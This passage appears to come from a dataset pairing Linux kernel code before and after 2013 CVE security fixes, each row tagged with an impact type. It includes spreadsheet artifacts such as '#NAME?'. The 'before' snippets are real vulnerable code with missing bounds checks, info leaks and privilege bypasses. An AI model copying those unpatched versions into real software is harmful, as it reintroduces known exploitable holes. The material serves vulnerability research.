	hdr->sadb_msg_errno = (uint8_t) 0;
	hdr->sadb_msg_satype = SADB_SATYPE_UNSPEC;
	hdr->sadb_msg_len = (sizeof(struct sadb_msg) / sizeof(uint64_t));

 pfkey_broadcast(skb_out, GFP_ATOMIC, BROADCAST_ALL, NULL, c->net);
 return 0;

","	hdr->sadb_msg_version = PF_KEY_V2;
	hdr->sadb_msg_errno = (uint8_t) 0;
	hdr->sadb_msg_len = (sizeof(struct sadb_msg) / sizeof(uint64_t));
	hdr->sadb_msg_reserved = 0;

 pfkey_broadcast(skb, GFP_ATOMIC, BROADCAST_ALL, NULL, c->net);

	hdr->sadb_msg_errno = (uint8_t) 0;
	hdr->sadb_msg_satype = SADB_SATYPE_UNSPEC;
	hdr->sadb_msg_len = (sizeof(struct sadb_msg) / sizeof(uint64_t));
	hdr->sadb_msg_reserved = 0;
 pfkey_broadcast(skb_out, GFP_ATOMIC, BROADCAST_ALL, NULL, c->net);
 return 0;

"
2013,DoS ,CVE-2013-2232," const struct flowi6 *fl6)
{
 struct ipv6_pinfo *np = inet6_sk(sk);
 struct rt6_info *rt = (struct rt6_info *)dst;

 if (!dst)
 goto out;







 /* Yes, checking route validity in not connected
	 * case is not very simple. Take into account,
	 * that we do not support routing by source, TOS,
"," const struct flowi6 *fl6)
{
 struct ipv6_pinfo *np = inet6_sk(sk);
 struct rt6_info *rt;

 if (!dst)
 goto out;

 if (dst->ops->family != AF_INET6) {
 dst_release(dst);
 return NULL;
	}

	rt = (struct rt6_info *)dst;
 /* Yes, checking route validity in not connected
	 * case is not very simple. Take into account,
	 * that we do not support routing by source, TOS,
"
2013,DoS ,CVE-2013-2206,"	}

 /* Delete the tempory new association. */
 sctp_add_cmd_sf(commands, SCTP_CMD_NEW_ASOC, SCTP_ASOC(new_asoc));
 sctp_add_cmd_sf(commands, SCTP_CMD_DELETE_TCB, SCTP_NULL());

 /* Restore association pointer to provide SCTP command interpeter
","	}

 /* Delete the tempory new association. */
 sctp_add_cmd_sf(commands, SCTP_CMD_SET_ASOC, SCTP_ASOC(new_asoc));
 sctp_add_cmd_sf(commands, SCTP_CMD_DELETE_TCB, SCTP_NULL());

 /* Restore association pointer to provide SCTP command interpeter
"
2013,#NAME?,CVE-2013-2164,,
2013,#NAME?,CVE-2013-2148,,
2013,#NAME?,CVE-2013-2147,,
2013,DoS ,CVE-2013-2146,"};

static struct extra_reg intel_snb_extra_regs[] __read_mostly = {
 INTEL_EVENT_EXTRA_REG(0xb7, MSR_OFFCORE_RSP_0, 0x3fffffffffull, RSP_0),
 INTEL_EVENT_EXTRA_REG(0xbb, MSR_OFFCORE_RSP_1, 0x3fffffffffull, RSP_1),






	EVENT_EXTRA_END
};

		x86_pmu.event_constraints = intel_snb_event_constraints;
		x86_pmu.pebs_constraints = intel_snb_pebs_event_constraints;
		x86_pmu.pebs_aliases = intel_pebs_aliases_snb;
		x86_pmu.extra_regs = intel_snb_extra_regs;



 /* all extra regs are per-cpu when HT is on */
		x86_pmu.er_flags |= ERF_HAS_RSP_1;
		x86_pmu.er_flags |= ERF_NO_HT_SHARING;
		x86_pmu.event_constraints = intel_ivb_event_constraints;
		x86_pmu.pebs_constraints = intel_ivb_pebs_event_constraints;
		x86_pmu.pebs_aliases = intel_pebs_aliases_snb;
		x86_pmu.extra_regs = intel_snb_extra_regs;



 /* all extra regs are per-cpu when HT is on */
		x86_pmu.er_flags |= ERF_HAS_RSP_1;
		x86_pmu.er_flags |= ERF_NO_HT_SHARING;
","};

static struct extra_reg intel_snb_extra_regs[] __read_mostly = {
 INTEL_EVENT_EXTRA_REG(0xb7, MSR_OFFCORE_RSP_0, 0x3f807f8fffull, RSP_0),
 INTEL_EVENT_EXTRA_REG(0xbb, MSR_OFFCORE_RSP_1, 0x3f807f8fffull, RSP_1),
	EVENT_EXTRA_END
};

static struct extra_reg intel_snbep_extra_regs[] __read_mostly = {
 INTEL_EVENT_EXTRA_REG(0xb7, MSR_OFFCORE_RSP_0, 0x3fffff8fffull, RSP_0),
 INTEL_EVENT_EXTRA_REG(0xbb, MSR_OFFCORE_RSP_1, 0x3fffff8fffull, RSP_1),
	EVENT_EXTRA_END
};

		x86_pmu.event_constraints = intel_snb_event_constraints;
		x86_pmu.pebs_constraints = intel_snb_pebs_event_constraints;
		x86_pmu.pebs_aliases = intel_pebs_aliases_snb;
 if (boot_cpu_data.x86_model == 45)
			x86_pmu.extra_regs = intel_snbep_extra_regs;
 else
			x86_pmu.extra_regs = intel_snb_extra_regs;
 /* all extra regs are per-cpu when HT is on */
		x86_pmu.er_flags |= ERF_HAS_RSP_1;
		x86_pmu.er_flags |= ERF_NO_HT_SHARING;
		x86_pmu.event_constraints = intel_ivb_event_constraints;
		x86_pmu.pebs_constraints = intel_ivb_pebs_event_constraints;
		x86_pmu.pebs_aliases = intel_pebs_aliases_snb;
 if (boot_cpu_data.x86_model == 62)
			x86_pmu.extra_regs = intel_snbep_extra_regs;
 else
			x86_pmu.extra_regs = intel_snb_extra_regs;
 /* all extra regs are per-cpu when HT is on */
		x86_pmu.er_flags |= ERF_HAS_RSP_1;
		x86_pmu.er_flags |= ERF_NO_HT_SHARING;
"
2013,#NAME?,CVE-2013-2141,"
static int do_tkill(pid_t tgid, pid_t pid, int sig)
{
 struct siginfo info;

	info.si_signo = sig;
	info.si_errno = 0;
","
static int do_tkill(pid_t tgid, pid_t pid, int sig)
{
 struct siginfo info = {};

	info.si_signo = sig;
	info.si_errno = 0;
"
2013,DoS ,CVE-2013-2140," int status = BLKIF_RSP_OKAY;
 struct block_device *bdev = blkif->vbd.bdev;
 unsigned long secure;












	blkif->st_ds_req++;

 xen_blkif_get(blkif);
	err = blkdev_issue_discard(bdev, req->u.discard.sector_number,
				   req->u.discard.nr_sectors,
				   GFP_KERNEL, secure);

 if (err == -EOPNOTSUPP) {
 pr_debug(DRV_PFX ""discard op failed, not supported\n"");
		status = BLKIF_RSP_EOPNOTSUPP;
"," int status = BLKIF_RSP_OKAY;
 struct block_device *bdev = blkif->vbd.bdev;
 unsigned long secure;
 struct phys_req preq;

	preq.sector_number = req->u.discard.sector_number;
	preq.nr_sects      = req->u.discard.nr_sectors;

	err = xen_vbd_translate(&preq, blkif, WRITE);
 if (err) {
 pr_warn(DRV_PFX ""access denied: DISCARD [%llu->%llu] on dev=%04x\n"",
			preq.sector_number,
			preq.sector_number + preq.nr_sects, blkif->vbd.pdevice);
 goto fail_response;
	}
	blkif->st_ds_req++;

 xen_blkif_get(blkif);
	err = blkdev_issue_discard(bdev, req->u.discard.sector_number,
				   req->u.discard.nr_sectors,
				   GFP_KERNEL, secure);
fail_response:
 if (err == -EOPNOTSUPP) {
 pr_debug(DRV_PFX ""discard op failed, not supported\n"");
		status = BLKIF_RSP_EOPNOTSUPP;
"
2013,DoS ,CVE-2013-2128," sk_eat_skb(sk, skb, 0);
 if (!desc->count)
 break;

	}
	tp->copied_seq = seq;

"," sk_eat_skb(sk, skb, 0);
 if (!desc->count)
 break;
		tp->copied_seq = seq;
	}
	tp->copied_seq = seq;

"
2013,#NAME?,CVE-2013-2094,"
static int perf_swevent_init(struct perf_event *event)
{
 int event_id = event->attr.config;

 if (event->attr.type != PERF_TYPE_SOFTWARE)
 return -ENOENT;
","
static int perf_swevent_init(struct perf_event *event)
{
 u64 event_id = event->attr.config;

 if (event->attr.type != PERF_TYPE_SOFTWARE)
 return -ENOENT;
"
2013,DoS Overflow ,CVE-2013-2058," else
		ci->hcd = hcd;




 return ret;
}

"," else
		ci->hcd = hcd;

 if (ci->platdata->flags & CI13XXX_DISABLE_STREAMING)
 hw_write(ci, OP_USBMODE, USBMODE_CI_SDIS, USBMODE_CI_SDIS);

 return ret;
}

"
2013,DoS ,CVE-2013-2017," return NETDEV_TX_OK;

rx_drop:
 kfree_skb(skb);
	rcv_stats->rx_dropped++;
 return NETDEV_TX_OK;
}
 *
 * return values:
 *	NET_RX_SUCCESS	(no congestion)
 *	NET_RX_DROP     (packet was dropped)
 *
 * dev_forward_skb can be used for injecting an skb from the
 * start_xmit function of one device into the receive queue
{
 skb_orphan(skb);

 if (!(dev->flags & IFF_UP))
 return NET_RX_DROP;

 if (skb->len > (dev->mtu + dev->hard_header_len))
 return NET_RX_DROP;

 skb_set_dev(skb, dev);
	skb->tstamp.tv64 = 0;
	skb->pkt_type = PACKET_HOST;
"," return NETDEV_TX_OK;

rx_drop:

	rcv_stats->rx_dropped++;
 return NETDEV_TX_OK;
}
 *
 * return values:
 *	NET_RX_SUCCESS	(no congestion)
 *	NET_RX_DROP     (packet was dropped, but freed)
 *
 * dev_forward_skb can be used for injecting an skb from the
 * start_xmit function of one device into the receive queue
{
 skb_orphan(skb);

 if (!(dev->flags & IFF_UP) ||
	    (skb->len > (dev->mtu + dev->hard_header_len))) {
 kfree_skb(skb);

 return NET_RX_DROP;
	}
 skb_set_dev(skb, dev);
	skb->tstamp.tv64 = 0;
	skb->pkt_type = PACKET_HOST;
"
2013,DoS ,CVE-2013-2015," struct ext4_iloc iloc;
 int err = 0;

 if (!EXT4_SB(inode->i_sb)->s_journal)

 return 0;

 mutex_lock(&EXT4_SB(inode->i_sb)->s_orphan_lock);
"," struct ext4_iloc iloc;
 int err = 0;

 if ((!EXT4_SB(inode->i_sb)->s_journal) &&
	    !(EXT4_SB(inode->i_sb)->s_mount_state & EXT4_ORPHAN_FS))
 return 0;

 mutex_lock(&EXT4_SB(inode->i_sb)->s_orphan_lock);
"
2013,#NAME?,CVE-2013-1979,"	scm->pid  = get_pid(pid);
	scm->cred = cred ? get_cred(cred) : NULL;
	scm->creds.pid = pid_vnr(pid);
	scm->creds.uid = cred ? cred->euid : INVALID_UID;
	scm->creds.gid = cred ? cred->egid : INVALID_GID;
}

static __inline__ void scm_destroy_cred(struct scm_cookie *scm)
","	scm->pid  = get_pid(pid);
	scm->cred = cred ? get_cred(cred) : NULL;
	scm->creds.pid = pid_vnr(pid);
	scm->creds.uid = cred ? cred->uid : INVALID_UID;
	scm->creds.gid = cred ? cred->gid : INVALID_GID;
}

static __inline__ void scm_destroy_cred(struct scm_cookie *scm)
"
2013,#NAME?,CVE-2013-1959,"		u32 id = new_map->extent[0].lower_first;
 if (cap_setid == CAP_SETUID) {
 kuid_t uid = make_kuid(ns->parent, id);
 if (uid_eq(uid, current_fsuid()))
 return true;
		}
 else if (cap_setid == CAP_SETGID) {
 kgid_t gid = make_kgid(ns->parent, id);
 if (gid_eq(gid, current_fsgid()))
 return true;
		}
	}
","		u32 id = new_map->extent[0].lower_first;
 if (cap_setid == CAP_SETUID) {
 kuid_t uid = make_kuid(ns->parent, id);
 if (uid_eq(uid, file->f_cred->fsuid))
 return true;
		}
 else if (cap_setid == CAP_SETGID) {
 kgid_t gid = make_kgid(ns->parent, id);
 if (gid_eq(gid, file->f_cred->fsgid))
 return true;
		}
	}
"
2013,Bypass ,CVE-2013-1958,"#include <linux/interrupt.h>
#include <linux/netdevice.h>
#include <linux/security.h>

#include <linux/pid.h>
#include <linux/nsproxy.h>
#include <linux/slab.h>
 if (!uid_valid(uid) || !gid_valid(gid))
 return -EINVAL;

 if ((creds->pid == task_tgid_vnr(current) || nsown_capable(CAP_SYS_ADMIN)) &&

	    ((uid_eq(uid, cred->uid)   || uid_eq(uid, cred->euid) ||
 uid_eq(uid, cred->suid)) || nsown_capable(CAP_SETUID)) &&
	    ((gid_eq(gid, cred->gid)   || gid_eq(gid, cred->egid) ||
","#include <linux/interrupt.h>
#include <linux/netdevice.h>
#include <linux/security.h>
#include <linux/pid_namespace.h>
#include <linux/pid.h>
#include <linux/nsproxy.h>
#include <linux/slab.h>
 if (!uid_valid(uid) || !gid_valid(gid))
 return -EINVAL;

 if ((creds->pid == task_tgid_vnr(current) ||
 ns_capable(current->nsproxy->pid_ns->user_ns, CAP_SYS_ADMIN)) &&
	    ((uid_eq(uid, cred->uid)   || uid_eq(uid, cred->euid) ||
 uid_eq(uid, cred->suid)) || nsown_capable(CAP_SETUID)) &&
	    ((gid_eq(gid, cred->gid)   || gid_eq(gid, cred->egid) ||
"
2013,Bypass ,CVE-2013-1957,"	}

	mnt->mnt.mnt_flags = old->mnt.mnt_flags & ~MNT_WRITE_HOLD;




 atomic_inc(&sb->s_active);
	mnt->mnt.mnt_sb = sb;
	mnt->mnt.mnt_root = dget(root);
 /* First pass: copy the tree topology */
	copy_flags = CL_COPY_ALL | CL_EXPIRE;
 if (user_ns != mnt_ns->user_ns)
		copy_flags |= CL_SHARED_TO_SLAVE;
	new = copy_tree(old, old->mnt.mnt_root, copy_flags);
 if (IS_ERR(new)) {
 up_write(&namespace_sem);
#include <linux/mnt_namespace.h>
#include <linux/mount.h>
#include <linux/fs.h>

#include ""internal.h""
#include ""pnode.h""

int propagate_mnt(struct mount *dest_mnt, struct dentry *dest_dentry,
 struct mount *source_mnt, struct list_head *tree_list)
{

 struct mount *m, *child;
 int ret = 0;
 struct mount *prev_dest_mnt = dest_mnt;

		source =  get_source(m, prev_dest_mnt, prev_src_mnt, &type);





		child = copy_tree(source, source->mnt.mnt_root, type);
 if (IS_ERR(child)) {
			ret = PTR_ERR(child);
#define CL_MAKE_SHARED 0x08
#define CL_PRIVATE 0x10
#define CL_SHARED_TO_SLAVE 0x20


static inline void set_mnt_shared(struct mount *mnt)
{
","	}

	mnt->mnt.mnt_flags = old->mnt.mnt_flags & ~MNT_WRITE_HOLD;
 /* Don't allow unprivileged users to change mount flags */
 if ((flag & CL_UNPRIVILEGED) && (mnt->mnt.mnt_flags & MNT_READONLY))
		mnt->mnt.mnt_flags |= MNT_LOCK_READONLY;

 atomic_inc(&sb->s_active);
	mnt->mnt.mnt_sb = sb;
	mnt->mnt.mnt_root = dget(root);
 /* First pass: copy the tree topology */
	copy_flags = CL_COPY_ALL | CL_EXPIRE;
 if (user_ns != mnt_ns->user_ns)
		copy_flags |= CL_SHARED_TO_SLAVE | CL_UNPRIVILEGED;
	new = copy_tree(old, old->mnt.mnt_root, copy_flags);
 if (IS_ERR(new)) {
 up_write(&namespace_sem);
#include <linux/mnt_namespace.h>
#include <linux/mount.h>
#include <linux/fs.h>
#include <linux/nsproxy.h>
#include ""internal.h""
#include ""pnode.h""

int propagate_mnt(struct mount *dest_mnt, struct dentry *dest_dentry,
 struct mount *source_mnt, struct list_head *tree_list)
{
 struct user_namespace *user_ns = current->nsproxy->mnt_ns->user_ns;
 struct mount *m, *child;
 int ret = 0;
 struct mount *prev_dest_mnt = dest_mnt;

		source =  get_source(m, prev_dest_mnt, prev_src_mnt, &type);

 /* Notice when we are propagating across user namespaces */
 if (m->mnt_ns->user_ns != user_ns)
			type |= CL_UNPRIVILEGED;

		child = copy_tree(source, source->mnt.mnt_root, type);
 if (IS_ERR(child)) {
			ret = PTR_ERR(child);
#define CL_MAKE_SHARED 0x08
#define CL_PRIVATE 0x10
#define CL_SHARED_TO_SLAVE 0x20
#define CL_UNPRIVILEGED 0x40

static inline void set_mnt_shared(struct mount *mnt)
{
"
2013,Bypass ,CVE-2013-1956," return check_mnt(real_mount(mnt));
}

























static void *mntns_get(struct task_struct *task)
{
 struct mnt_namespace *ns = NULL;
 spin_unlock(&fs->lock);
}



#endif /* _LINUX_FS_STRUCT_H */
 kgid_t group = new->egid;
 int ret;










 /* The creator needs a mapping in the parent user namespace
	 * or else we won't be able to reasonably tell userspace who
	 * created a user_namespace.
"," return check_mnt(real_mount(mnt));
}

bool current_chrooted(void)
{
 /* Does the current process have a non-standard root */
 struct path ns_root;
 struct path fs_root;
 bool chrooted;

 /* Find the namespace root */
	ns_root.mnt = &current->nsproxy->mnt_ns->root->mnt;
	ns_root.dentry = ns_root.mnt->mnt_root;
 path_get(&ns_root);
 while (d_mountpoint(ns_root.dentry) && follow_down_one(&ns_root))
		;

 get_fs_root(current->fs, &fs_root);

	chrooted = !path_equal(&fs_root, &ns_root);

 path_put(&fs_root);
 path_put(&ns_root);

 return chrooted;
}

static void *mntns_get(struct task_struct *task)
{
 struct mnt_namespace *ns = NULL;
 spin_unlock(&fs->lock);
}

extern bool current_chrooted(void);

#endif /* _LINUX_FS_STRUCT_H */
 kgid_t group = new->egid;
 int ret;

 /*
	 * Verify that we can not violate the policy of which files
	 * may be accessed that is specified by the root directory,
	 * by verifing that the root directory is at the root of the
	 * mount namespace which allows all files to be accessed.
 */
 if (current_chrooted())
 return -EPERM;

 /* The creator needs a mapping in the parent user namespace
	 * or else we won't be able to reasonably tell userspace who
	 * created a user_namespace.
"
2013,#NAME?,CVE-2013-1943,"		}

		ptep_user = (pt_element_t __user *)((void *)host_addr + offset);
 if (unlikely(copy_from_user(&pte, ptep_user, sizeof(pte)))) {
			present = false;
 break;
		}
 goto out;
 if (mem->guest_phys_addr & (PAGE_SIZE - 1))
 goto out;
 if (user_alloc && (mem->userspace_addr & (PAGE_SIZE - 1)))



 goto out;
 if (mem->slot >= KVM_MEMORY_SLOTS + KVM_PRIVATE_MEM_SLOTS)
 goto out;
	addr = gfn_to_hva(kvm, gfn);
 if (kvm_is_error_hva(addr))
 return -EFAULT;
	r = copy_from_user(data, (void __user *)addr + offset, len);
 if (r)
 return -EFAULT;
 return 0;
","		}

		ptep_user = (pt_element_t __user *)((void *)host_addr + offset);
 if (unlikely(__copy_from_user(&pte, ptep_user, sizeof(pte)))) {
			present = false;
 break;
		}
 goto out;
 if (mem->guest_phys_addr & (PAGE_SIZE - 1))
 goto out;
 /* We can read the guest memory with __xxx_user() later on. */
 if (user_alloc &&
	    ((mem->userspace_addr & (PAGE_SIZE - 1)) ||
	     !access_ok(VERIFY_WRITE, mem->userspace_addr, mem->memory_size)))
 goto out;
 if (mem->slot >= KVM_MEMORY_SLOTS + KVM_PRIVATE_MEM_SLOTS)
 goto out;
	addr = gfn_to_hva(kvm, gfn);
 if (kvm_is_error_hva(addr))
 return -EFAULT;
	r = __copy_from_user(data, (void __user *)addr + offset, len);
 if (r)
 return -EFAULT;
 return 0;
"
2013,DoS Exec Code Overflow ,CVE-2013-1929," if (j + len > block_end)
 goto partno;

 memcpy(tp->fw_ver, &vpd_data[j], len);
 strncat(tp->fw_ver, "" bc "", vpdlen - len - 1);



	}

partno:
"," if (j + len > block_end)
 goto partno;

 if (len >= sizeof(tp->fw_ver))
			len = sizeof(tp->fw_ver) - 1;
 memset(tp->fw_ver, 0, sizeof(tp->fw_ver));
 snprintf(tp->fw_ver, sizeof(tp->fw_ver), ""%.*s bc "", len,
			 &vpd_data[j]);
	}

partno:
"
2013,#NAME?,CVE-2013-1928,"
	err  = get_user(palp, &up->palette);
	err |= get_user(length, &up->length);



	up_native = compat_alloc_user_space(sizeof(struct video_spu_palette));
	err  = put_user(compat_ptr(palp), &up_native->palette);
","
	err  = get_user(palp, &up->palette);
	err |= get_user(length, &up->length);
 if (err)
 return -EFAULT;

	up_native = compat_alloc_user_space(sizeof(struct video_spu_palette));
	err  = put_user(compat_ptr(palp), &up_native->palette);
"
2013,DoS Exec Code Overflow ,CVE-2013-1860,"#define WDM_RESPONDING 7
#define WDM_SUSPENDING 8
#define WDM_RESETTING 9


#define WDM_MAX 16

{
 struct wdm_device *desc = urb->context;
 int status = urb->status;


 spin_lock(&desc->iuspin);
 clear_bit(WDM_RESPONDING, &desc->flags);
	}

	desc->rerr = status;
	desc->reslength = urb->actual_length;
 memmove(desc->ubuf + desc->length, desc->inbuf, desc->reslength);
	desc->length += desc->reslength;








skip_error:
 wake_up(&desc->wait);

			rv = -ENODEV;
 goto err;
		}





		i++;
 if (file->f_flags & O_NONBLOCK) {
 if (!test_bit(WDM_READ, &desc->flags)) {
 spin_unlock_irq(&desc->iuspin);
 goto retry;
		}

 if (!desc->reslength) { /* zero length read */
 dev_dbg(&desc->intf->dev, ""%s: zero length - clearing WDM_READ\n"", __func__);
 clear_bit(WDM_READ, &desc->flags);
 struct wdm_device *desc = wdm_find_device(intf);
 int rv;


 clear_bit(WDM_RESETTING, &desc->flags);
	rv = recover_from_urb_loss(desc);
 mutex_unlock(&desc->wlock);
","#define WDM_RESPONDING 7
#define WDM_SUSPENDING 8
#define WDM_RESETTING 9
#define WDM_OVERFLOW 10

#define WDM_MAX 16

{
 struct wdm_device *desc = urb->context;
 int status = urb->status;
 int length = urb->actual_length;

 spin_lock(&desc->iuspin);
 clear_bit(WDM_RESPONDING, &desc->flags);
	}

	desc->rerr = status;
 if (length + desc->length > desc->wMaxCommand) {
 /* The buffer would overflow */
 set_bit(WDM_OVERFLOW, &desc->flags);
	} else {
 /* we may already be in overflow */
 if (!test_bit(WDM_OVERFLOW, &desc->flags)) {
 memmove(desc->ubuf + desc->length, desc->inbuf, length);
			desc->length += length;
			desc->reslength = length;
		}
	}
skip_error:
 wake_up(&desc->wait);

			rv = -ENODEV;
 goto err;
		}
 if (test_bit(WDM_OVERFLOW, &desc->flags)) {
 clear_bit(WDM_OVERFLOW, &desc->flags);
			rv = -ENOBUFS;
 goto err;
		}
		i++;
 if (file->f_flags & O_NONBLOCK) {
 if (!test_bit(WDM_READ, &desc->flags)) {
 spin_unlock_irq(&desc->iuspin);
 goto retry;
		}

 if (!desc->reslength) { /* zero length read */
 dev_dbg(&desc->intf->dev, ""%s: zero length - clearing WDM_READ\n"", __func__);
 clear_bit(WDM_READ, &desc->flags);
 struct wdm_device *desc = wdm_find_device(intf);
 int rv;

 clear_bit(WDM_OVERFLOW, &desc->flags);
 clear_bit(WDM_RESETTING, &desc->flags);
	rv = recover_from_urb_loss(desc);
 mutex_unlock(&desc->wlock);
"
2013,#NAME?,CVE-2013-1858," if ((clone_flags & (CLONE_NEWNS|CLONE_FS)) == (CLONE_NEWNS|CLONE_FS))
 return ERR_PTR(-EINVAL);




 /*
	 * Thread groups must share signals as well, and detached threads
	 * can only be started up within the thread group.
	 * If unsharing a user namespace must also unshare the thread.
 */
 if (unshare_flags & CLONE_NEWUSER)
		unshare_flags |= CLONE_THREAD;
 /*
	 * If unsharing a pid namespace must also unshare the thread.
 */
#include <linux/uaccess.h>
#include <linux/ctype.h>
#include <linux/projid.h>


static struct kmem_cache *user_ns_cachep __read_mostly;

 if (atomic_read(&current->mm->mm_users) > 1)
 return -EINVAL;




 if (!ns_capable(user_ns, CAP_SYS_ADMIN))
 return -EPERM;

"," if ((clone_flags & (CLONE_NEWNS|CLONE_FS)) == (CLONE_NEWNS|CLONE_FS))
 return ERR_PTR(-EINVAL);

 if ((clone_flags & (CLONE_NEWUSER|CLONE_FS)) == (CLONE_NEWUSER|CLONE_FS))
 return ERR_PTR(-EINVAL);

 /*
	 * Thread groups must share signals as well, and detached threads
	 * can only be started up within the thread group.
	 * If unsharing a user namespace must also unshare the thread.
 */
 if (unshare_flags & CLONE_NEWUSER)
		unshare_flags |= CLONE_THREAD | CLONE_FS;
 /*
	 * If unsharing a pid namespace must also unshare the thread.
 */
#include <linux/uaccess.h>
#include <linux/ctype.h>
#include <linux/projid.h>
#include <linux/fs_struct.h>

static struct kmem_cache *user_ns_cachep __read_mostly;

 if (atomic_read(&current->mm->mm_users) > 1)
 return -EINVAL;

 if (current->fs->users != 1)
 return -EINVAL;

 if (!ns_capable(user_ns, CAP_SYS_ADMIN))
 return -EPERM;

"
2013,#NAME?,CVE-2013-1848," return bdev;

fail:
 ext3_msg(sb, ""error: failed to open journal device %s: %ld"",
 __bdevname(dev, b), PTR_ERR(bdev));

 return NULL;
 /*todo: use simple_strtoll with >32bit ext3 */
	sb_block = simple_strtoul(options, &options, 0);
 if (*options && *options != ',') {
 ext3_msg(sb, ""error: invalid sb specification: %s"",
		       (char *) *data);
 return 1;
	}
"," return bdev;

fail:
 ext3_msg(sb, KERN_ERR, ""error: failed to open journal device %s: %ld"",
 __bdevname(dev, b), PTR_ERR(bdev));

 return NULL;
 /*todo: use simple_strtoll with >32bit ext3 */
	sb_block = simple_strtoul(options, &options, 0);
 if (*options && *options != ',') {
 ext3_msg(sb, KERN_ERR, ""error: invalid sb specification: %s"",
		       (char *) *data);
 return 1;
	}
"
2013,#NAME?,CVE-2013-1828," if (len < sizeof(sctp_assoc_t))
 return -EINVAL;




 if (copy_from_user(&sas, optval, len))
 return -EFAULT;

 /* Mark beginning of a new observation period */
	asoc->stats.max_obs_rto = asoc->rto_min;

 /* Allow the struct to grow and fill in as much as possible */
	len = min_t(size_t, len, sizeof(sas));

 if (put_user(len, optlen))
 return -EFAULT;

"," if (len < sizeof(sctp_assoc_t))
 return -EINVAL;

 /* Allow the struct to grow and fill in as much as possible */
	len = min_t(size_t, len, sizeof(sas));

 if (copy_from_user(&sas, optval, len))
 return -EFAULT;

 /* Mark beginning of a new observation period */
	asoc->stats.max_obs_rto = asoc->rto_min;




 if (put_user(len, optlen))
 return -EFAULT;

"
2013,DoS +Priv ,CVE-2013-1827,"					u32 __user *optval, int __user *optlen)
{
 int rc = -ENOPROTOOPT;
 if (ccid->ccid_ops->ccid_hc_rx_getsockopt != NULL)
		rc = ccid->ccid_ops->ccid_hc_rx_getsockopt(sk, optname, len,
						 optval, optlen);
 return rc;
					u32 __user *optval, int __user *optlen)
{
 int rc = -ENOPROTOOPT;
 if (ccid->ccid_ops->ccid_hc_tx_getsockopt != NULL)
		rc = ccid->ccid_ops->ccid_hc_tx_getsockopt(sk, optname, len,
						 optval, optlen);
 return rc;
","					u32 __user *optval, int __user *optlen)
{
 int rc = -ENOPROTOOPT;
 if (ccid != NULL && ccid->ccid_ops->ccid_hc_rx_getsockopt != NULL)
		rc = ccid->ccid_ops->ccid_hc_rx_getsockopt(sk, optname, len,
						 optval, optlen);
 return rc;
					u32 __user *optval, int __user *optlen)
{
 int rc = -ENOPROTOOPT;
 if (ccid != NULL && ccid->ccid_ops->ccid_hc_tx_getsockopt != NULL)
		rc = ccid->ccid_ops->ccid_hc_tx_getsockopt(sk, optname, len,
						 optval, optlen);
 return rc;
"
2013,DoS +Priv ,CVE-2013-1826,"{
 struct xfrm_dump_info info;
 struct sk_buff *skb;


	skb = nlmsg_new(NLMSG_DEFAULT_SIZE, GFP_ATOMIC);
 if (!skb)
	info.nlmsg_seq = seq;
	info.nlmsg_flags = 0;

 if (dump_one_state(x, 0, &info)) {

 kfree_skb(skb);
 return NULL;
	}

 return skb;
","{
 struct xfrm_dump_info info;
 struct sk_buff *skb;
 int err;

	skb = nlmsg_new(NLMSG_DEFAULT_SIZE, GFP_ATOMIC);
 if (!skb)
	info.nlmsg_seq = seq;
	info.nlmsg_flags = 0;

	err = dump_one_state(x, 0, &info);
 if (err) {
 kfree_skb(skb);
 return ERR_PTR(err);
	}

 return skb;
"
2013,DoS ,CVE-2013-1819," struct rb_node		*parent;
 xfs_buf_t		*bp;
 xfs_daddr_t		blkno = map[0].bm_bn;

 int			numblks = 0;
 int			i;

 ASSERT(!(numbytes < (1 << btp->bt_sshift)));
 ASSERT(!(BBTOB(blkno) & (xfs_off_t)btp->bt_smask));


















 /* get tree root */
	pag = xfs_perag_get(btp->bt_mount,
 xfs_daddr_to_agno(btp->bt_mount, blkno));
"," struct rb_node		*parent;
 xfs_buf_t		*bp;
 xfs_daddr_t		blkno = map[0].bm_bn;
 xfs_daddr_t		eofs;
 int			numblks = 0;
 int			i;

 ASSERT(!(numbytes < (1 << btp->bt_sshift)));
 ASSERT(!(BBTOB(blkno) & (xfs_off_t)btp->bt_smask));

 /*
	 * Corrupted block numbers can get through to here, unfortunately, so we
	 * have to check that the buffer falls within the filesystem bounds.
 */
	eofs = XFS_FSB_TO_BB(btp->bt_mount, btp->bt_mount->m_sb.sb_dblocks);
 if (blkno >= eofs) {
 /*
		 * XXX (dgc): we should really be returning EFSCORRUPTED here,
		 * but none of the higher level infrastructure supports
		 * returning a specific error on buffer lookup failures.
 */
 xfs_alert(btp->bt_mount,
 ""%s: Block out of range: block 0x%llx, EOFS 0x%llx "",
			  __func__, blkno, eofs);
 return NULL;
	}

 /* get tree root */
	pag = xfs_perag_get(btp->bt_mount,
 xfs_daddr_to_agno(btp->bt_mount, blkno));
"
2013,DoS +Info ,CVE-2013-1798,"			u32 redir_index = (ioapic->ioregsel - 0x10) >> 1;
			u64 redir_content;

 ASSERT(redir_index < IOAPIC_NUM_PINS);





			redir_content = ioapic->redirtbl[redir_index].bits;
			result = (ioapic->ioregsel & 0x1) ?
			    (redir_content >> 32) & 0xffffffff :
			    redir_content & 0xffffffff;
","			u32 redir_index = (ioapic->ioregsel - 0x10) >> 1;
			u64 redir_content;

 if (redir_index < IOAPIC_NUM_PINS)
				redir_content =
					ioapic->redirtbl[redir_index].bits;
 else
				redir_content = ~0ULL;


			result = (ioapic->ioregsel & 0x1) ?
			    (redir_content >> 32) & 0xffffffff :
			    redir_content & 0xffffffff;
"
2013,DoS Mem. Corr. ,CVE-2013-1797," gpa_t time;
 struct pvclock_vcpu_time_info hv_clock;
 unsigned int hw_tsc_khz;
 unsigned int time_offset;
 struct page *time_page;
 /* set guest stopped flag in pvclock flags field */
 bool pvclock_set_guest_stopped_request;

 unsigned long flags, this_tsc_khz;
 struct kvm_vcpu_arch *vcpu = &v->arch;
 struct kvm_arch *ka = &v->kvm->arch;
 void *shared_kaddr;
	s64 kernel_ns, max_kernel_ns;
	u64 tsc_timestamp, host_tsc;
 struct pvclock_vcpu_time_info *guest_hv_clock;
	u8 pvclock_flags;
 bool use_master_clock;


 local_irq_restore(flags);

 if (!vcpu->time_page)
 return 0;

 /*
 */
	vcpu->hv_clock.version += 2;

 shared_kaddr = kmap_atomic(vcpu->time_page);

 guest_hv_clock = shared_kaddr + vcpu->time_offset;

 /* retain PVCLOCK_GUEST_STOPPED if set in guest copy */
	pvclock_flags = (guest_hv_clock->flags & PVCLOCK_GUEST_STOPPED);

 if (vcpu->pvclock_set_guest_stopped_request) {
		pvclock_flags |= PVCLOCK_GUEST_STOPPED;

